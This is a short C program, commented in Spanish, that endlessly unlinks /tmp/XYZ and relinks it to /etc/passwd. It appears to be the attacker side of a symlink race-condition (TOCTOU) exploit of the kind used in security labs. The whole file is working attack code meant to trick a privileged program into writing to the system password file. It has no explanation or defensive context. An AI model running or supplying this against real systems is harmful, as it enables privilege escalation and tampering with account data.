#include <unistd.h>
#include <stdio.h>

int main() {
    while (1) {
        unlink("/tmp/XYZ");               // Elimina si existe
        symlink("/etc/passwd", "/tmp/XYZ"); // Crea nuevo enlace simbólico
    }
    return 0;
}
